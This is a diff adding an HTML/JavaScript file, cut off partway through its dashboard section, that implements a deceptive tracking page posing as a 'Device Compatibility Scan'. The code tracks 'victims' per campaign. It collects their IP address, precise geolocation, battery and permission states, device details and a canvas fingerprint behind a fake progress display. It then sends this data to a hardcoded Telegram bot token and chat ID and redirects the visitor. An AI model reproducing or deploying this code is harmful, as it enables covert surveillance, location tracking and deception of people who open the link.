@@ -1,0 +1,1820 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Information Scanner</title>
+    <!-- Bootstrap 5 CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body id="main-body">
+    <!-- Content will be loaded dynamically -->
+
+    <!-- Bootstrap JS Bundle with Popper -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+    
+    <script>
+        // ============================================
+        // GLOBAL VARIABLES AND CONFIGURATION
+        // ============================================
+        
+        // Store for all victim data collected
+        let victimsData = [];
+        
+        // Campaign and link management
+        const campaignManager = {
+            campaigns: [],
+            currentLink: '',
+            currentCampaign: null,
+            
+            addCampaign: function(name, link, data) {
+                const campaign = {
+                    id: 'camp_' + Date.now(),
+                    name: name,
+                    link: link,
+                    created: new Date().toISOString(),
+                    stats: {
+                        views: 0,
+                        clicks: 0,
+                        dataCollected: 0,
+                        lastAccess: null
+                    },
+                    settings: data,
+                    victims: []
+                };
+                
+                this.campaigns.push(campaign);
+                this.currentCampaign = campaign;
+                this.saveAllData();
+                
+                return campaign;
+            },
+            
+            addVictim: function(campaignId, victimData) {
+                console.log('Adding victim to campaign:', campaignId, victimData);
+                
+                // Find or create campaign
+                let campaign = this.campaigns.find(c => c.id === campaignId);
+                if (!campaign) {
+                    // Create a new campaign if it doesn't exist
+                    campaign = {
+                        id: campaignId,
+                        name: 'Auto-generated Campaign',
+                        link: window.location.href,
+                        created: new Date().toISOString(),
+                        stats: {
+                            views: 0,
+                            clicks: 1,
+                            dataCollected: 1,
+                            lastAccess: new Date().toISOString()
+                        },
+                        settings: {},
+                        victims: []
+                    };
+                    this.campaigns.push(campaign);
+                }
+                
+                // Generate victim ID if not present
+                if (!victimData.id) {
+                    victimData.id = 'victim_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                }
+                
+                victimData.campaignId = campaignId;
+                victimData.campaignName = campaign.name;
+                victimData.receivedAt = new Date().toISOString();
+                
+                // Add to campaign
+                campaign.victims.push(victimData);
+                campaign.stats.dataCollected++;
+                campaign.stats.clicks++;
+                campaign.stats.lastAccess = new Date().toISOString();
+                
+                // Add to global victims array
+                victimsData.push(victimData);
+                
+                // Save all data
+                this.saveAllData();
+                
+                console.log('Victim added successfully:', victimData.id);
+                return victimData;
+            },
+            
+            getVictims: function(campaignId = null) {
+                if (campaignId) {
+                    const campaign = this.campaigns.find(c => c.id === campaignId);
+                    return campaign ? campaign.victims : [];
+                }
+                // Return all victims from all campaigns
+                const allVictims = this.campaigns.flatMap(campaign => campaign.victims);
+                return allVictims;
+            },
+            
+            incrementStat: function(campaignId, stat) {
+                const campaign = this.campaigns.find(c => c.id === campaignId);
+                if (campaign && campaign.stats[stat] !== undefined) {
+                    campaign.stats[stat]++;
+                    campaign.stats.lastAccess = new Date().toISOString();
+                    this.saveAllData();
+                }
+            },
+            
+            saveAllData: function() {
+                try {
+                    // Save campaigns with victims
+                    localStorage.setItem('deviceScannerCampaigns', JSON.stringify(this.campaigns));
+                    // Save global victims array
+                    localStorage.setItem('deviceScannerVictims', JSON.stringify(victimsData));
+                    console.log('Data saved to localStorage');
+                } catch (e) {
+                    console.error('Failed to save data:', e);
+                }
+            },
+            
+            loadAllData: function() {
+                try {
+                    console.log('Loading data from localStorage...');
+                    
+                    // Load campaigns
+                    const savedCampaigns = localStorage.getItem('deviceScannerCampaigns');
+                    if (savedCampaigns) {
+                        this.campaigns = JSON.parse(savedCampaigns);
+                        console.log('Loaded campaigns:', this.campaigns.length);
+                    }
+                    
+                    // Load global victims
+                    const savedVictims = localStorage.getItem('deviceScannerVictims');
+                    if (savedVictims) {
+                        victimsData = JSON.parse(savedVictims);
+                        console.log('Loaded victims:', victimsData.length);
+                    }
+                    
+                    // Ensure victims are properly linked to campaigns
+                    this.syncVictimsToCampaigns();
+                    
+                    return true;
+                } catch (e) {
+                    console.error('Failed to load data:', e);
+                    // Initialize empty arrays if corrupted
+                    this.campaigns = [];
+                    victimsData = [];
+                    return false;
+                }
+            },
+            
+            syncVictimsToCampaigns: function() {
+                // Make sure all victims in victimsData are also in their respective campaigns
+                victimsData.forEach(victim => {
+                    if (victim.campaignId) {
+                        const campaign = this.campaigns.find(c => c.id === victim.campaignId);
+                        if (campaign) {
+                            // Check if victim exists in campaign
+                            const exists = campaign.victims.some(v => v.id === victim.id);
+                            if (!exists) {
+                                campaign.victims.push(victim);
+                            }
+                        }
+                    }
+                });
+            },
+            
+            getCampaignStats: function() {
+                return this.campaigns.map(c => ({
+                    id: c.id,
+                    name: c.name,
+                    link: c.link,
+                    stats: c.stats
+                }));
+            },
+            
+            // Clear all data (for testing)
+            clearAllData: function() {
+                this.campaigns = [];
+                victimsData = [];
+                localStorage.removeItem('deviceScannerCampaigns');
+                localStorage.removeItem('deviceScannerVictims');
+                console.log('All data cleared');
+            }
+        };
+
+        // Telegram bot configuration
+        const telegramConfig = {
+            botToken: '7992081098:AAH8uPHC5iGtVt2CB8h6oCaZuCo33BUkfX0',
+            chatId: '1523864238',
+            apiUrl: 'https://api.telegram.org/bot',
+            sendHistory: []
+        };
+
+        // ============================================
+        // INITIALIZATION AND ACCESS DETECTION
+        // ============================================
+
+        // Initialize when page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            // Apply styles
+            applyStyles();
+            
+            // Load data from storage first
+            campaignManager.loadAllData();
+            
+            // Check if this is a victim accessing via generated link
+            const urlParams = new URLSearchParams(window.location.search);
+            const campaignId = urlParams.get('cid');
+            const tracking = urlParams.get('track');
+            
+            console.log('URL params:', { campaignId, tracking });
+            console.log('Current victims count:', victimsData.length);
+            
+            if (tracking === 'true' && campaignId) {
+                // This is a victim accessing via tracking link
+                console.log('Victim accessing tracking link for campaign:', campaignId);
+                createVictimInterface(campaignId);
+                campaignManager.incrementStat(campaignId, 'clicks');
+                
+                // Start data collection after a short delay
+                setTimeout(() => {
+                    collectAllDataForVictim(campaignId);
+                }, 1500);
+            } else {
+                // This is dashboard access
+                console.log('Loading dashboard interface');
+                loadDashboardInterface();
+            }
+        });
+
+        // ============================================
+        // STYLES
+        // ============================================
+
+        function applyStyles() {
+            const style = document.createElement('style');
+            style.textContent = `
+                :root {
+                    --primary-color: #2c3e50;
+                    --secondary-color: #3498db;
+                    --accent-color: #e74c3c;
+                    --light-bg: #ecf0f1;
+                    --dark-bg: #2c3e50;
+                }
+                
+                /* VICTIM INTERFACE STYLES */
+                .victim-interface {
+                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                    min-height: 100vh;
+                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+                    padding: 20px;
+                }
+                
+                .victim-card {
+                    background: white;
+                    border-radius: 15px;
+                    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+                    overflow: hidden;
+                    max-width: 600px;
+                    margin: 0 auto;
+                }
+                
+                .victim-header {
+                    background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
+                    color: white;
+                    padding: 25px;
+                    text-align: center;
+                }
+                
+                .victim-body {
+                    padding: 30px;
+                }
+                
+                .checklist-item {
+                    padding: 12px;
+                    border-bottom: 1px solid #eee;
+                    display: flex;
+                    align-items: center;
+                    transition: all 0.3s;
+                }
+                
+                .checklist-item.completed {
+                    color: #28a745;
+                }
+                
+                .checklist-item.completed i {
+                    color: #28a745;
+                }
+                
+                .checklist-item.active {
+                    background-color: #f8f9fa;
+                    border-left: 4px solid var(--secondary-color);
+                }
+                
+                .victim-footer {
+                    padding: 20px;
+                    background-color: #f8f9fa;
+                    border-top: 1px solid #eee;
+                    text-align: center;
+                    font-size: 0.9rem;
+                    color: #666;
+                }
+                
+                /* DASHBOARD STYLES */
+                .dashboard-interface {
+                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                    min-height: 100vh;
+                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+                }
+                
+                .glass-card {
+                    background: rgba(255, 255, 255, 0.95);
+                    backdrop-filter: blur(10px);
+                    border-radius: 20px;
+                    border: 1px solid rgba(255, 255, 255, 0.2);
+                    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+                }
+                
+                .info-card {
+                    transition: transform 0.3s, box-shadow 0.3s;
+                    height: 100%;
+                    border: none;
+                    border-radius: 15px;
+                    overflow: hidden;
+                }
+                
+                .info-card:hover {
+                    transform: translateY(-5px);
+                    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+                }
+                
+                .card-header {
+                    background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
+                    color: white;
+                    border-bottom: none;
+                    font-weight: 600;
+                    letter-spacing: 0.5px;
+                }
+                
+                .card-icon {
+                    font-size: 1.5rem;
+                    margin-right: 10px;
+                }
+                
+                .data-item {
+                    padding: 10px 15px;
+                    border-bottom: 1px solid #eee;
+                    display: flex;
+                    justify-content: space-between;
+                    align-items: center;
+                }
+                
+                .data-item:last-child {
+                    border-bottom: none;
+                }
+                
+                .data-label {
+                    font-weight: 600;
+                    color: var(--primary-color);
+                }
+                
+                .data-value {
+                    color: #555;
+                    text-align: right;
+                    word-break: break-word;
+                    max-width: 60%;
+                }
+                
+                .victim-item {
+                    border-left: 4px solid var(--secondary-color);
+                    margin-bottom: 10px;
+                    padding: 15px;
+                    background: #f8f9fa;
+                    border-radius: 10px;
+                    cursor: pointer;
+                    transition: all 0.3s;
+                }
+                
+                .victim-item:hover {
+                    transform: translateX(5px);
+                    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+                }
+                
+                .victim-item.active {
+                    border-left-color: var(--accent-color);
+                    background: #fff;
+                    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+                }
+                
+                .victim-badge {
+                    font-size: 0.7rem;
+                    padding: 3px 8px;
+                    border-radius: 10px;
+                    margin-left: 5px;
+                }
+                
+                .victim-ip {
+                    font-family: monospace;
+                    background: #e9ecef;
+                    padding: 2px 5px;
+                    border-radius: 3px;
+                    font-size: 0.85rem;
+                }
+                
+                .progress {
+                    height: 25px;
+                    border-radius: 50px;
+                    margin: 10px 0;
+                }
+                
+                .progress-bar {
+                    background: linear-gradient(45deg, var(--secondary-color), #2980b9);
+                    border-radius: 50px;
+                }
+                
+                /* Text color fixes */
+                body, p, span, div, h1, h2, h3, h4, h5, h6 {
+                    color: #333;
+                }
+                
+                .text-muted {
+                    color: #6c757d !important;
+                }
+                
+                /* Buttons */
+                .download-btn {
+                    background: linear-gradient(45deg, #27ae60, #2ecc71);
+                    color: white;
+                    border: none;
+                    padding: 12px 30px;
+                    border-radius: 50px;
+                    font-weight: 600;
+                    font-size: 1.1rem;
+                    transition: all 0.3s;
+                }
+                
+                .download-btn:hover {
+                    transform: translateY(-3px);
+                    box-shadow: 0 10px 20px rgba(39, 174, 96, 0.3);
+                }
+                
+                .telegram-btn {
+                    background: linear-gradient(45deg, #0088cc, #00aced);
+                    color: white;
+                    border: none;
+                    padding: 12px 30px;
+                    border-radius: 50px;
+                    font-weight: 600;
+                    font-size: 1.1rem;
+                    transition: all 0.3s;
+                }
+                
+                .telegram-btn:hover {
+                    transform: translateY(-3px);
+                    box-shadow: 0 10px 20px rgba(0, 136, 204, 0.3);
+                }
+                
+                .link-btn {
+                    background: linear-gradient(45deg, #9b59b6, #8e44ad);
+                    color: white;
+                    border: none;
+                    padding: 12px 30px;
+                    border-radius: 50px;
+                    font-weight: 600;
+                    font-size: 1.1rem;
+                    transition: all 0.3s;
+                }
+                
+                .link-btn:hover {
+                    transform: translateY(-3px);
+                    box-shadow: 0 10px 20px rgba(155, 89, 182, 0.3);
+                }
+                
+                /* Responsive adjustments */
+                @media (max-width: 768px) {
+                    .victim-card {
+                        margin: 10px;
+                    }
+                    
+                    .data-item {
+                        flex-direction: column;
+                        align-items: flex-start;
+                    }
+                    
+                    .data-value {
+                        text-align: left;
+                        max-width: 100%;
+                        margin-top: 5px;
+                    }
+                }
+            `;
+            document.head.appendChild(style);
+        }
+
+        // ============================================
+        // VICTIM INTERFACE
+        // ============================================
+
+        function createVictimInterface(campaignId) {
+            document.body.className = 'victim-interface';
+            
+            const urlParams = new URLSearchParams(window.location.search);
+            const title = urlParams.get('title') || 'Device Compatibility Scan';
+            const redirect = urlParams.get('redirect') || 'https://google.com';
+            
+            document.body.innerHTML = `
+                <div class="victim-card">
+                    <div class="victim-header">
+                        <h1 class="display-6 mb-2">
+                            <i class="fas fa-shield-alt"></i> ${title}
+                        </h1>
+                        <p class="mb-0">Ensuring optimal device performance</p>
+                    </div>
+                    
+                    <div class="victim-body">
+                        <div class="text-center mb-4">
+                            <div class="spinner-border text-primary mb-3" style="width: 3rem; height: 3rem;" role="status">
+                                <span class="visually-hidden">Loading...</span>
+                            </div>
+                            <h4 id="status-message">Initializing Compatibility Scan</h4>
+                            <p class="text-muted" id="status-details">
+                                Please wait while we analyze your device configuration
+                            </p>
+                        </div>
+                        
+                        <div class="progress mb-4" style="height: 20px;">
+                            <div id="scan-progress" class="progress-bar progress-bar-striped progress-bar-animated" 
+                                 role="progressbar" style="width: 5%">
+                                <span class="progress-text">5%</span>
+                            </div>
+                        </div>
+                        
+                        <div id="checklist" class="mb-4">
+                            <div class="checklist-item active">
+                                <i class="fas fa-spinner fa-spin text-primary me-2"></i>
+                                <span>Device Information Scan</span>
+                            </div>
+                            <div class="checklist-item">
+                                <i class="fas fa-clock me-2"></i>
+                                <span>Network Analysis</span>
+                            </div>
+                            <div class="checklist-item">
+                                <i class="fas fa-clock me-2"></i>
+                                <span>Security Diagnostics</span>
+                            </div>
+                            <div class="checklist-item">
+                                <i class="fas fa-clock me-2"></i>
+                                <span>Performance Optimization</span>
+                            </div>
+                            <div class="checklist-item">
+                                <i class="fas fa-clock me-2"></i>
+                                <span>Final Verification</span>
+                            </div>
+                        </div>
+                        
+                        <div class="alert alert-info">
+                            <i class="fas fa-info-circle"></i>
+                            <strong>Important:</strong> Do not close this window during the scan. 
+                            The process will complete automatically.
+                        </div>
+                    </div>
+                    
+                    <div class="victim-footer">
+                        <div class="d-flex justify-content-center align-items-center">
+                            <i class="fas fa-circle text-success me-2" style="font-size: 0.7rem;"></i>
+                            <span>Scan in progress • Estimated time: 15 seconds</span>
+                        </div>
+                    </div>
+                </div>
+            `;
+        }
+
+        async function collectAllDataForVictim(campaignId) {
+            console.log('Starting data collection for campaign:', campaignId);
+            
+            const totalSteps = 5;
+            
+            // Create device data object for this victim
+            const victimDeviceData = {
+                deviceInfo: {},
+                networkInfo: {},
+                batteryInfo: {},
+                locationInfo: {},
+                storageInfo: {},
+                permissionsInfo: {},
+                fingerprintInfo: {},
+                timestamp: new Date().toISOString()
+            };
+            
+            try {
+                // Step 1: Device Info
+                updateVictimProgress(1, totalSteps, "Collecting Device Information...");
+                collectDeviceInfoForVictim(victimDeviceData);
+                await delay(1000);
+                
+                // Step 2: Network Info
+                updateVictimProgress(2, totalSteps, "Analyzing Network Configuration...");
+                await collectNetworkInfoForVictim(victimDeviceData);
+                await delay(1000);
+                
+                // Step 3: Security/Fingerprint
+                updateVictimProgress(3, totalSteps, "Running Security Diagnostics...");
+                collectFingerprintInfoForVictim(victimDeviceData);
+                await delay(1000);
+                
+                // Step 4: Additional Info
+                updateVictimProgress(4, totalSteps, "Optimizing Performance...");
+                collectStorageInfoForVictim(victimDeviceData);
+                await collectBatteryInfoForVictim(victimDeviceData);
+                await collectPermissionsInfoForVictim(victimDeviceData);
+                await delay(1000);
+                
+                // Step 5: Location (optional)
+                updateVictimProgress(5, totalSteps, "Finalizing Scan...");
+                try {
+                    await getLocationForVictim(victimDeviceData);
+                } catch (e) {
+                    console.log('Location not available:', e.message);
+                }
+                
+                // Generate victim ID
+                victimDeviceData.victimID = generateVictimID();
+                
+                console.log('Victim data collected:', victimDeviceData);
+                
+                // Save victim data to campaign
+                const savedVictim = campaignManager.addVictim(campaignId, victimDeviceData);
+                console.log('Victim saved:', savedVictim ? savedVictim.id : 'Failed');
+                
+                // Send to Telegram immediately
+                try {
+                    await sendVictimDataToTelegram(savedVictim, campaignId);
+                } catch (e) {
+                    console.error('Failed to send to Telegram:', e);
+                }
+                
+                // Show completion and redirect
+                completeVictimScan(campaignId);
+                
+                return victimDeviceData;
+                
+            } catch (error) {
+                console.error('Error collecting victim data:', error);
+                // Still save whatever data we have
+                victimDeviceData.victimID = generateVictimID();
+                victimDeviceData.error = error.message;
+                campaignManager.addVictim(campaignId, victimDeviceData);
+                completeVictimScan(campaignId);
+                return victimDeviceData;
+            }
+        }
+
+        // ============================================
+        // VICTIM DATA COLLECTION FUNCTIONS
+        // ============================================
+
+        function collectDeviceInfoForVictim(victimData) {
+            victimData.deviceInfo = {
+                platform: navigator.platform || 'Unknown',
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                languages: navigator.languages,
+                deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                screenResolution: `${window.screen.width} x ${window.screen.height}`,
+                colorDepth: `${window.screen.colorDepth} bit`,
+                pixelRatio: window.devicePixelRatio || 1,
+                orientation: window.screen.width > window.screen.height ? 'Landscape' : 'Portrait',
+                deviceName: getDeviceName(),
+                timestamp: new Date().toISOString()
+            };
+        }
+
+        async function collectNetworkInfoForVictim(victimData) {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                
+                victimData.networkInfo = {
+                    ipv4: data.ip,
+                    onlineStatus: navigator.onLine ? 'Online' : 'Offline',
+                    timestamp: new Date().toISOString()
+                };
+                
+                if (navigator.connection) {
+                    const conn = navigator.connection;
+                    victimData.networkInfo.connectionType = conn.effectiveType || 'Unknown';
+                    victimData.networkInfo.downlink = conn.downlink || 'Unknown';
+                    victimData.networkInfo.rtt = conn.rtt || 'Unknown';
+                    victimData.networkInfo.saveData = conn.saveData ? 'Enabled' : 'Disabled';
+                }
+            } catch (error) {
+                victimData.networkInfo = {
+                    ipv4: 'Unable to retrieve',
+                    onlineStatus: navigator.onLine ? 'Online' : 'Offline',
+                    timestamp: new Date().toISOString()
+                };
+            }
+        }
+
+        async function getLocationForVictim(victimData) {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject(new Error('Geolocation not supported'));
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        victimData.locationInfo = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            altitudeAccuracy: position.coords.altitudeAccuracy,
+                            heading: position.coords.heading,
+                            speed: position.coords.speed,
+                            timestamp: new Date(position.timestamp).toISOString(),
+                            source: 'victim_access'
+                        };
+                        resolve(position);
+                    },
+                    error => reject(error),
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            });
+        }
+
+        function collectStorageInfoForVictim(victimData) {
+            victimData.storageInfo = {
+                available: 'Unknown',
+                used: 'Unknown',
+                timestamp: new Date().toISOString()
+            };
+        }
+
+        async function collectBatteryInfoForVictim(victimData) {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    victimData.batteryInfo = {
+                        level: Math.round(battery.level * 100) + '%',
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime,
+                        timestamp: new Date().toISOString()
+                    };
+                } catch (error) {
+                    victimData.batteryInfo = {
+                        level: 'Unknown',
+                        charging: 'Unknown',
+                        timestamp: new Date().toISOString()
+                    };
+                }
+            } else {
+                victimData.batteryInfo = {
+                    level: 'Unknown',
+                    charging: 'Unknown',
+                    timestamp: new Date().toISOString()
+                };
+            }
+        }
+
+        async function collectPermissionsInfoForVictim(victimData) {
+            victimData.permissionsInfo = {
+                timestamp: new Date().toISOString()
+            };
+            
+            const permissions = ['camera', 'microphone', 'geolocation', 'notifications'];
+            for (const permission of permissions) {
+                try {
+                    const result = await navigator.permissions.query({ name: permission });
+                    victimData.permissionsInfo[permission] = result.state;
+                } catch (error) {
+                    victimData.permissionsInfo[permission] = 'Not supported';
+                }
+            }
+        }
+
+        function collectFingerprintInfoForVictim(victimData) {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                if (ctx) {
+                    ctx.textBaseline = 'top';
+                    ctx.font = '14px Arial';
+                    ctx.textBaseline = 'alphabetic';
+                    ctx.fillStyle = '#f60';
+                    ctx.fillRect(125, 1, 62, 20);
+                    ctx.fillStyle = '#069';
+                    ctx.fillText('Fingerprint', 2, 15);
+                    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                    ctx.fillText('Fingerprint', 4, 17);
+                    
+                    const canvasData = canvas.toDataURL();
+                    victimData.fingerprintInfo = {
+                        canvas: simpleHash(canvasData),
+                        userAgent: simpleHash(navigator.userAgent),
+                        platform: simpleHash(navigator.platform),
+                        languages: simpleHash(navigator.languages?.join(',') || ''),
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
+                        screen: simpleHash(`${window.screen.width}x${window.screen.height}x${window.screen.colorDepth}`),
+                        plugins: simpleHash(Array.from(navigator.plugins || []).map(p => p.name).join(',')),
+                        timestamp: new Date().toISOString()
+                    };
+                }
+            } catch (error) {
+                victimData.fingerprintInfo = {
+                    error: error.message,
+                    timestamp: new Date().toISOString()
+                };
+            }
+        }
+
+        // ============================================
+        // VICTIM PROGRESS FUNCTIONS
+        // ============================================
+
+        function updateVictimProgress(step, totalSteps, message) {
+            const progress = Math.min(100, Math.round((step / totalSteps) * 100));
+            
+            const progressBar = document.getElementById('scan-progress');
+            const statusMessage = document.getElementById('status-message');
+            const statusDetails = document.getElementById('status-details');
+            
+            if (progressBar) {
+                progressBar.style.width = `${progress}%`;
+                const progressText = progressBar.querySelector('.progress-text');
+                if (progressText) {
+                    progressText.textContent = `${progress}%`;
+                }
+            }
+            
+            if (statusMessage && message) {
+                statusMessage.textContent = message;
+            }
+            
+            if (statusDetails) {
+                const messages = [
+                    "Analyzing device specifications and hardware...",
+                    "Checking network connectivity and security...",
+                    "Running comprehensive security diagnostics...",
+                    "Optimizing performance settings...",
+                    "Finalizing scan and generating report..."
+                ];
+                statusDetails.textContent = messages[step - 1] || "Finalizing scan...";
+            }
+            
+            // Update checklist
+            const checklistItems = document.querySelectorAll('.checklist-item');
+            if (checklistItems.length >= step) {
+                for (let i = 0; i < checklistItems.length; i++) {
+                    checklistItems[i].classList.remove('active');
+                    
+                    if (i < step - 1) {
+                        // Completed steps
+                        checklistItems[i].innerHTML = '<i class="fas fa-check text-success me-2"></i>' + 
+                            checklistItems[i].textContent;
+                        checklistItems[i].classList.add('completed');
+                    } else if (i === step - 1) {
+                        // Current step
+                        checklistItems[i].innerHTML = '<i class="fas fa-spinner fa-spin text-primary me-2"></i>' + 
+                            checklistItems[i].textContent;
+                        checklistItems[i].classList.add('active');
+                    }
+                }
+            }
+        }
+
+        function completeVictimScan(campaignId) {
+            const urlParams = new URLSearchParams(window.location.search);
+            const redirectUrl = urlParams.get('redirect') || 'https://google.com';
+            
+            // Update UI to show completion
+            document.getElementById('status-message').textContent = 'Scan Complete!';
+            document.getElementById('status-details').textContent = 'Your device has been successfully analyzed and optimized.';
+            
+            // Hide spinner
+            const spinner = document.querySelector('.spinner-border');
+            if (spinner) spinner.style.display = 'none';
+            
+            // Update progress bar
+            const progressBar = document.getElementById('scan-progress');
+            if (progressBar) {
+                progressBar.classList.remove('progress-bar-animated', 'progress-bar-striped');
+                progressBar.classList.add('bg-success');
+                progressBar.style.width = '100%';
+                const progressText = progressBar.querySelector('.progress-text');
+                if (progressText) {
+                    progressText.textContent = '100%';
+                }
+            }
+            
+            // Update all checklist items to completed
+            document.querySelectorAll('.checklist-item').forEach(item => {
+                item.innerHTML = '<i class="fas fa-check text-success me-2"></i>' + item.textContent;
+                item.classList.add('completed');
+                item.classList.remove('active');
+            });
+            
+            // Show success message
+            const alertDiv = document.querySelector('.alert');
+            if (alertDiv) {
+                alertDiv.className = 'alert alert-success';
+                alertDiv.innerHTML = `
+                    <i class="fas fa-check-circle"></i>
+                    <strong>Scan Successful!</strong> Your device is now optimized. 
+                    Redirecting in <span id="countdown">3</span> seconds...
+                `;
+            }
+            
+            // Countdown and redirect
+            let countdown = 3;
+            const countdownElement = document.getElementById('countdown');
+            const countdownInterval = setInterval(() => {
+                countdown--;
+                if (countdownElement) {
+                    countdownElement.textContent = countdown;
+                }
+                if (countdown <= 0) {
+                    clearInterval(countdownInterval);
+                    window.location.href = redirectUrl;
+                }
+            }, 1000);
+            
+            // Update footer
+            const footer = document.querySelector('.victim-footer');
+            if (footer) {
+                footer.innerHTML = `
+                    <div class="d-flex justify-content-center align-items-center">
+                        <i class="fas fa-check-circle text-success me-2"></i>
+                        <span>Scan completed successfully • Redirecting...</span>
+                    </div>
+                `;
+            }
+        }
+
+        // ============================================
+        // TELEGRAM FUNCTIONS
+        // ============================================
+
+        async function sendVictimDataToTelegram(victimData, campaignId) {
+            try {
+                const campaign = campaignManager.campaigns.find(c => c.id === campaignId);
+                const campaignName = campaign ? campaign.name : 'Unknown Campaign';
+                
+                // Format message
+                const message = formatVictimTelegramMessage(victimData, campaignName);
+                
+                // Send to Telegram
+                await sendTelegramMessage(message);
+                
+                // Send JSON data
+                const jsonData = JSON.stringify(victimData, null, 2);
+                await sendTelegramDocument(
+                    new Blob([jsonData], { type: 'application/json' }),
+                    `victim-${victimData.id || Date.now()}.json`,
+                    `Complete victim data from campaign: ${campaignName}`
+                );
+                
+                return true;
+                
+            } catch (error) {
+                console.error('Failed to send victim data:', error);
+                return false;
+            }
+        }
+
+        function formatVictimTelegramMessage(victimData, campaignName) {
+            let message = `🎯 *NEW VICTIM DATA CAPTURED!*\n\n`;
+            message += `📊 *Campaign:* ${campaignName}\n`;
+            message += `🆔 *Victim ID:* ${victimData.victimID || 'N/A'}\n`;
+            message += `⏰ *Time:* ${new Date(victimData.timestamp).toLocaleString()}\n`;
+            message += `🔗 *Source:* Generated Tracking Link\n\n`;
+            
+            if (victimData.deviceInfo) {
+                message += `📱 *Device Info:*\n`;
+                message += `• Platform: ${victimData.deviceInfo.platform || 'Unknown'}\n`;
+                message += `• Device: ${victimData.deviceInfo.deviceName || 'Unknown'}\n`;
+                message += `• Resolution: ${victimData.deviceInfo.screenResolution || 'Unknown'}\n`;
+                message += `• User Agent: \`${victimData.deviceInfo.userAgent?.substring(0, 50)}...\`\n`;
+            }
+            
+            if (victimData.locationInfo?.latitude) {
+                message += `\n📍 *Location:*\n`;
+                message += `• Lat: ${victimData.locationInfo.latitude.toFixed(6)}\n`;
+                message += `• Lon: ${victimData.locationInfo.longitude.toFixed(6)}\n`;
+                message += `• Accuracy: ${victimData.locationInfo.accuracy?.toFixed(2) || 'Unknown'} meters\n`;
+                message += `• Map: https://maps.google.com/?q=${victimData.locationInfo.latitude},${victimData.locationInfo.longitude}\n`;
+            }
+            
+            if (victimData.networkInfo?.ipv4) {
+                message += `\n🌐 *Network:*\n`;
+                message += `• IP: \`${victimData.networkInfo.ipv4}\`\n`;
+                message += `• Type: ${victimData.networkInfo.connectionType || 'Unknown'}\n`;
+                message += `• Status: ${victimData.networkInfo.onlineStatus || 'Unknown'}\n`;
+            }
+            
+            if (victimData.fingerprintInfo?.canvas) {
+                message += `\n🆔 *Fingerprint:*\n`;
+                message += `• Hash: \`${victimData.fingerprintInfo.canvas.substring(0, 32)}...\`\n`;
+                message += `• Timezone: ${victimData.fingerprintInfo.timezone || 'Unknown'}\n`;
+            }
+            
+            message += `\n_Data automatically collected via tracking link_`;
+            
+            return message;
+        }
+
+        async function sendTelegramMessage(text) {
+            if (!telegramConfig.botToken || !telegramConfig.chatId) {
+                console.warn('Telegram configuration missing');
+                return;
+            }
+            
+            const url = `${telegramConfig.apiUrl}${telegramConfig.botToken}/sendMessage`;
+            
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: telegramConfig.chatId,
+                    text: text,
+                    parse_mode: 'Markdown',
+                    disable_web_page_preview: true
+                })
+            });
+            
+            const data = await response.json();
+            
+            if (!data.ok) {
+                throw new Error(data.description || 'Telegram API error');
+            }
+            
+            return data;
+        }
+
+        async function sendTelegramDocument(blob, filename, caption = '') {
+            if (!telegramConfig.botToken || !telegramConfig.chatId) {
+                console.warn('Telegram configuration missing');
+                return;
+            }
+            
+            const url = `${telegramConfig.apiUrl}${telegramConfig.botToken}/sendDocument`;
+            
+            const formData = new FormData();
+            formData.append('chat_id', telegramConfig.chatId);
+            formData.append('document', blob, filename);
+            
+            if (caption) {
+                formData.append('caption', caption);
+            }
+            
+            const response = await fetch(url, {
+                method: 'POST',
+                body: formData
+            });
+            
+            const data = await response.json();
+            
+            if (!data.ok) {
+                throw new Error(data.description || 'Telegram API error');
+            }
+            
+            return data;
+        }
+
+        // ============================================
+        // DASHBOARD INTERFACE
+        // ============================================
+
+        function loadDashboardInterface() {
+            document.body.className = 'dashboard-interface';
+            document.body.innerHTML = `
+                <div class="container py-5">
+                    <div class="row justify-content-center">
+                        <div class="col-12">
+                            <div class="glass-card p-4 mb-4">
+                                <div class="row align-items-center">
+                                    <div class="col-md-5">
